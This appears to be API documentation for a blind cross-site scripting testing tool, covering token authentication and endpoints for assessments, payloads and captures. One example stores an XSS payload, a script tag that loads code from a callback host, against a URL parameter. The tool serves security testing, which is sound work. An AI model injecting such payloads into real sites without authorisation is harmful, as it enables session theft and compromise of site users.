##API##
The API can be used for tool development and automation.  

##API Authentication##
After creating an admin account, navigate to the Admin model and copy the token.  You will need the token to perform any API requests.

![Token](http://i.snag.gy/bc8vP.jpg "Token")

You *MUST* send the token as a header in each request.  Here is an example for creating a new Assessment:

    POST /api/assessments HTTP/1.1
    Token: 7bf26bd2a9782a3a3422b6abb5c2d0ebe58999a984bf0bcf8197f56f84f0c878cfd37c76c0339b12
    Content-Type: application/json
    Content-Length: 29
    

    {"name": "stuff.netflix.com"}
    
    
###Assessment API###

**API Calls**

| HTTP Method | URI | ACTION | 
| ----------- | --- | ------ |
| GET | http://[hostname]/api/assessments | Retrieve a list of assessments |
| GET | http://[hostname]/api/assessments/[id] | Retrieve a specific assessment | 
| POST | http://[hostname]/api/assessments | Create a new assessment |
| PUT | http://[hostname]/api/assessments/[id] | Update a specific assessment |
| DELETE | http://[hostname]/api/assessments/[id]  | Delete an assessment|

**JSON parameters**

| Parameter | Type | Required | Description | 
| --------- | ---- | -------- | ----------- |
| id | integer | True (For PUT/GET/DELETE| id field for PUT/GET/DELETE requests|
| name | string | True | The application or assessment identifier | 


###Payload API###

**API Calls**

| HTTP Method | URI | ACTION | 
| ----------- | --- | ------ |
| GET | http://[hostname]/api/payloads | Retrieve a list of payloads |
| GET | http://[hostname]/api/payloads/[id] | Retrieve a specific payload | 
| POST | http://[hostname]/api/payloads | Create a new payload |
| PUT | http://[hostname]/api/payloads/[id] | Update a specific payload |
| DELETE | http://[hostname]/api/payloads/[id]  | Delete a payload|

**JSON parameters**

| Parameter | Type | Required | Description | 
| --------- | ---- | -------- | ----------- |
| id | integer | True (For PUT/GET/DELETE| id field for PUT/GET/DELETE requests|
| assessment | string | True | The application or assessment identifier | 
| payload | string | True | The injection string.  Can also use $1 as plaeholder for payload | 
| method | string | False | The request method (GET/POST/PUT/DELETE) | 
| url | string | False | The URL you are testing | 
| parameter | string | False | The parameter you are testing |
| notes | string | False | Notes on the payload | 


**POST Request**

    {
        "assessment": "Example",
        "payload": "<script src=$1></script>",
        "method": "GET",
        "parameter": "UID",
        "notes": "",
        "url": "http://www.foo.com/what.php?UID=2343"
    }
    
**POST Response**

    HTTP/1.0 201 CREATED
    Content-Type: application/json
    Content-Length: 200
    Date: Tue, 04 Feb 2014 00:30:14 GMT
    
    {
        "assessment": "Example", 
        "id": 2, 
        "method": "GET", 
        "notes": "", 
        "parameter": "UID", 
        "payload": "<script src=\"//127.0.0.1:8081/x?u=None\"></script>",
        "url": "http://www.foo.com/what.php?UID=2343"
    }


       
       
###Capture API###
| HTTP Method | URI | ACTION | 
| ----------- | --- | ------ |
| GET | http://[hostname]/api/captures | Retrieve a list of captures |
| GET | http://[hostname]/api/captures/[id] | Retrieve a specific capture | 
| DELETE | http://[hostname]/api/captures/[id]  | Delete a capture|

